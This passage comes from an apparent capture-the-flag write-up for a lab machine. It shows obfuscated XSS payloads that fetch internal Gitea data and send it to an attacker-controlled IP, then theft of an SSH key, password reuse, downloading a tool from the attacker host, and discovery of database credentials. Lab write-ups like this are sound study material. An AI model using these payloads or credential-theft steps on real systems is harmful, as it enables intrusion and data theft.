+<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>clone_url<span class="st">": "</span>http://dev.snippet.htb/charlie/backups.git<span class="st">",</span></span>
+<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a><span class="st">            [... snip ...]</span></span>
+<span id="cb17-27"><a href="#cb17-27" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>default_branch<span class="st">": "</span>master<span class="st">",</span></span>
+<span id="cb17-28"><a href="#cb17-28" aria-hidden="true" tabindex="-1"></a><span class="st">            [... snip ...]</span></span>
+<span id="cb17-29"><a href="#cb17-29" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>permissions<span class="st">": {</span></span>
+<span id="cb17-30"><a href="#cb17-30" aria-hidden="true" tabindex="-1"></a><span class="st">                "</span>admin<span class="st">": true,</span></span>
+<span id="cb17-31"><a href="#cb17-31" aria-hidden="true" tabindex="-1"></a><span class="st">                "</span>push<span class="st">": true,</span></span>
+<span id="cb17-32"><a href="#cb17-32" aria-hidden="true" tabindex="-1"></a><span class="st">                "</span>pull<span class="st">": true</span></span>
+<span id="cb17-33"><a href="#cb17-33" aria-hidden="true" tabindex="-1"></a><span class="st">            [... snip ...]</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This seems very promising, <code>charlie</code> have a repo of his home directory and within we’ll hopefully find his <code>id_rsa</code>. Lets try to expand the XSS further to <code>fetch(http://dev.snippet.htb/charlie/backups)</code>. Trying this for a few times and we get no callbacks, maybe the response is to big resulting in an error and hence no callbacks. Lets try to go right for the money instead, we can assume that <code>id_rsa</code> should be at <code>http://dev.snippet.htb/charlie/backups/raw/branch/master/.ssh/id_rsa</code>.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [10/Sep/2022 10:27:30] <span class="st">"GET /Tm90IGZvdW5kLgo= HTTP/1.1"</span> 404 <span class="at">-</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension echo <span class="st">"Tm90IGZvdW5kLgo="</span> <span class="kw">|</span> <span class="fu">base64</span> <span class="at">-d</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> found.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>It is not.. nor is it directly at <code>http://dev.snippet.htb/charlie/backups/raw/branch/master/id_rsa</code>.. Instead of guessing blindly we can do a GET request to list the contents of the <em>backups</em> repo:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Issues body</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>remove-me<span class="op">&gt;&lt;</span>img <span class="va">sRc</span><span class="op">=</span><span class="st">"e"</span> <span class="va">onerror</span><span class="op">=</span>eval.call<span class="kw">`</span><span class="va">${</span><span class="er">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va">}</span><span class="kw">`</span><span class="op">&gt;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="co">## HTTP Server</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [10/Sep/2022 11:28:09] <span class="st">"GET /W3sibmFtZSI6 [... snip ...]</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension echo "</span>W3sibmFtZSI6 [... snip ...]<span class="st">" | base64 -d &gt; tmp_backups-content.txt</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension python3 -m json.tool tmp_backups-content.txt &gt; xss_repo-backups-content.json</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension cat xss_repo-backups-content.json</span></span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="st">[</span></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="st">    {</span></span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>name<span class="st">": "</span>backup.tar.gz<span class="st">",</span></span>
+<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>path<span class="st">": "</span>backup.tar.gz<span class="st">",</span></span>
+<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>sha<span class="st">": "</span>c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st">",</span></span>
+<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>type<span class="st">": "</span>file<span class="st">",</span></span>
+<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>size<span class="st">": 4316,</span></span>
+<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>encoding<span class="st">": null,</span></span>
+<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>content<span class="st">": null,</span></span>
+<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>target<span class="st">": null,</span></span>
+<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>url<span class="st">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz<span class="pp">?</span>ref=master<span class="st">",</span></span>
+<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>html_url<span class="st">": "</span>http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz<span class="st">",</span></span>
+<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>git_url<span class="st">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st">",</span></span>
+<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>download_url<span class="st">": "</span>http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz<span class="st">",</span></span>
+<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>submodule_git_url<span class="st">": null,</span></span>
+<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a><span class="st">        "</span>_links<span class="st">": {</span></span>
+<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>self<span class="st">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz<span class="pp">?</span>ref=master<span class="st">",</span></span>
+<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>git<span class="st">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st">",</span></span>
+<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a><span class="st">            "</span>html<span class="st">": "</span>http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz<span class="st">"</span></span>
+<span id="cb19-29"><a href="#cb19-29" aria-hidden="true" tabindex="-1"></a><span class="st">        }</span></span>
+<span id="cb19-30"><a href="#cb19-30" aria-hidden="true" tabindex="-1"></a><span class="st">    }</span></span>
+<span id="cb19-31"><a href="#cb19-31" aria-hidden="true" tabindex="-1"></a><span class="st">]</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We find a nice <code>download_url</code> go at it one last time and <code>fetch(http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz)</code>. At this point I noticed a problem, the base64 created to download <code>backup.tar.gz</code> contained <code>+</code> signs and all payloads containing <code>+</code> had not worked - neither did this one.. So instead I aimed for <code>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57</code> and thank god no <code>+</code> and we’re able to extract the content.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="co">## Issues body</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>remove-me<span class="op">&gt;&lt;</span>img <span class="va">sRc</span><span class="op">=</span><span class="st">"e"</span> <span class="va">onerror</span><span class="op">=</span>eval.call<span class="kw">`</span><span class="va">${</span><span class="er">"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9naXQvYmxvYnMvYzI1Y2I5ZDFmMWQ4M2JkYWQ0MWRhZDQwMzg3NGMyYzliOTFkMGI1NycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"</span><span class="va">}</span><span class="kw">`</span><span class="op">&gt;</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="co">## HTTP Server</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.171</span> <span class="at">-</span> <span class="at">-</span> [10/Sep/2022 11:46:20] <span class="st">"GET /eyJjb250 [... snip ...]</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension echo "</span>eyJjb250 [... snip ...]<span class="st">" | base64 -d &gt; tmp_backups.txt</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension python3 -m json.tool tmp_backups.txt &gt; xss_backups-blob.json</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension cat xss_backups-blob.json</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="st">{</span></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>content<span class="st">": "</span>H4sIANO61GEAA [... snip ...]<span class="st">",</span></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>encoding<span class="st">": "</span>base64<span class="st">",</span></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>url<span class="st">": "</span>http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st">",</span></span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>sha<span class="st">": "</span>c25cb9d1f1d83bdad41dad403874c2c9b91d0b57<span class="st">",</span></span>
+<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="st">    "</span>size<span class="st">": 4316</span></span>
+<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a><span class="st">}</span></span>
+<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension echo "</span>H4sIANO61GEAA [... snip ...]<span class="st">" | base64 -d &gt; backups.tar.gz</span></span>
+<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="st">➜  extension tar -xvf backups.tar.gz</span></span>
+<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/</span></span>
+<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/backups/</span></span>
+<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/backups/backup.tar.gz</span></span>
+<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.profile</span></span>
+<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.bash_history</span></span>
+<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.bash_logout</span></span>
+<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.ssh/</span></span>
+<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.ssh/id_rsa</span></span>
+<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.ssh/id_rsa.pub</span></span>
+<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a><span class="st">home/charlie/.bashrc</span></span>
+<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a><span class="st">➜  .ssh ssh charlie@extension.htb -i id_rsa </span></span>
+<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a><span class="st">charlie@extension:~$ id &amp;&amp; hostname</span></span>
+<span id="cb20-33"><a href="#cb20-33" aria-hidden="true" tabindex="-1"></a><span class="st">uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)</span></span>
+<span id="cb20-34"><a href="#cb20-34" aria-hidden="true" tabindex="-1"></a><span class="st">extension</span></span>
+<span id="cb20-35"><a href="#cb20-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb20-36"><a href="#cb20-36" aria-hidden="true" tabindex="-1"></a><span class="st">charlie@extension:~$ cat .git-credentials </span></span>
+<span id="cb20-37"><a href="#cb20-37" aria-hidden="true" tabindex="-1"></a><span class="st">http://charlie:MqiereNBGq4DqSVYaC8nazMXzuYqFJ9WPnIZSIWz@dev.snippet.htb</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-5" class="level3">
+<h3 class="anchored" data-anchor-id="step-5">Step 5</h3>
+<p>User <code>charlie</code> doesn’t have access to <code>user.txt</code>, we still need to pivot to <code>jean</code>. We noticed earlier that Jean used the same password for Git and Mail, trying to change user with <code>su jean</code> proves that she yet again use the same password.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">charlie@extension:~$</span> su jean</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span> EHmfar1Y7ppA9O5TAIXnYnJpA</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:~$</span> id</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">jean</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">jean</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">jean</span><span class="kw">)</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:~$</span> cat user.txt</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a><span class="ex">5f1b4312834b32b832925f86933a700b</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<hr>
+</section>
+</section>
+<section id="root" class="level1">
+<h1>ROOT</h1>
+<section id="step-1-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
+<p>Checking the usual directories and commands for anomalies - <code>/</code>, <code>/opt</code>, <code>/tmp</code>, <code>/var/www</code>, <code>sudo -l</code>, <code>ps aux</code>, <code>netstat -tulpn</code></p>
+<p>We find <code>/snap</code>, it’s not very common for HTB boxes but this might be an exception as it’s a Ubuntu host we’re on.</p>
+<p>Interesting directories in <strong><code>/opt</code>:</strong></p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:/opt$</span> ls <span class="at">-al</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 16</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  4 root root 4096 Jan  3  2022 .</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 24 root root 4096 Jun 24 14:57 ..</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drwx--x--x</span>  4 root root 4096 Jan  2  2022 containerd</span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>  4 root root 4096 Jan  3  2022 WebDriver</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Mozilla profile in <code>/tmp</code>:</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:/tmp$</span> ls <span class="at">-al</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 13 root root 4096 Sep 10 11:05 rust_mozprofileI7joD3</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>However it only contains 3 of the 4 files needed (missing <code>logins.json</code>) and we cant’t read <code>cert9.db</code> nor <code>key4.db</code>:</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:/tmp/rust_mozprofileI7joD3$</span> ls <span class="at">-al</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 16312</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>  1 root root  229376 Sep 10 07:48 cert9.db</span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>  1 root root  524288 Sep 10 11:05 cookies.sqlite</span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-------</span>  1 root root  294912 Sep 10 07:48 key4.db</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>A lot of new internal port:</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:/var/www$</span> netstat <span class="at">-tulpn</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="kw">(</span><span class="ex">Not</span> all processes could be identified, non-owned process info</span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">will</span> not be shown, you would have to be root to see it all.<span class="kw">)</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Active</span> Internet connections <span class="er">(</span><span class="ex">only</span> servers<span class="kw">)</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 0.0.0.0:9000            0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:3306          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:587           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:143           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.53:53           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                               </span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:3000          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:25            0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:43743         0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:8001          0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-16"><a href="#cb25-16" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:993           0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>                   </span>
+<span id="cb25-17"><a href="#cb25-17" aria-hidden="true" tabindex="-1"></a><span class="ex">tcp</span>        0      0 127.0.0.1:41411         0.0.0.0:<span class="pp">*</span>               LISTEN      <span class="at">-</span>    </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Looking in the nginx config we can identify port 3000, 8000 and 8001:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">jean@extension:/etc/nginx$</span> cat sites-available/default</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="ex">server_name</span> _<span class="kw">;</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">proxy_pass</span> http://127.0.0.1:8001<span class="kw">;</span></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true" tabindex="-1"></a><span class="ex">server_name</span> mail.snippet.htb<span class="kw">;</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">proxy_pass</span> http://127.0.0.1:8000<span class="kw">;</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true" tabindex="-1"></a><span class="ex">server_name</span> dev.snippet.htb<span class="kw">;</span></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true" tabindex="-1"></a>    <span class="ex">proxy_pass</span> http://127.0.0.1:3000<span class="kw">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Copy over <code>pspy64</code> and see if there’s anything executing behind the scenes:</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">charlie@extension:/dev/shm$</span> wget http://10.10.14.10/pspy64</span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">charlie@extension:/dev/shm$</span> chmod +x pspy64</span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="ex">charlie@extension:/dev/shm$</span> ./pspy64</span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8058   <span class="kw">|</span> <span class="fu">sh</span> <span class="at">-c</span> mysql <span class="at">-u</span> root <span class="at">-ptoor</span> <span class="at">--database</span> webapp <span class="at">--execute</span> <span class="st">"delete from snippets where id &gt; 2;"</span></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8065   <span class="kw">|</span> <span class="ex">docker</span> exec 2ee49381d443 sh <span class="at">-c</span> mysql <span class="at">-u</span> root <span class="at">-ptoor</span> <span class="at">--database</span> webapp <span class="at">--execute</span> <span class="st">"UPDATE users set password='30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82' where email='charlie@snippet.htb';"</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="ex">2022/09/11</span> 13:15:01 CMD: UID=0    PID=8115   <span class="kw">|</span> <span class="fu">sh</span> <span class="at">-c</span> mysql <span class="at">-u</span> root <span class="at">-ptoor</span> <span class="at">--database</span> webapp <span class="at">--execute</span> <span class="st">"UPDATE users set password='7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6' where email='jean@snippet.htb';"</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We find credentials and database name for mysql - <code>root:toor</code>. Setup SSH tunnels and change one of the previous found accounts <code>user_type</code> from <em>Member</em> to <strong>Manager</strong>:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  .ssh ssh <span class="at">-N</span> <span class="at">-f</span> <span class="at">-L</span> 3306:localhost:3306 charlie@extension.htb <span class="at">-i</span> id_rsa</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  extension mysql <span class="at">-h</span> 127.0.0.1 <span class="at">-D</span> webapp <span class="at">-u</span> root <span class="at">-p</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
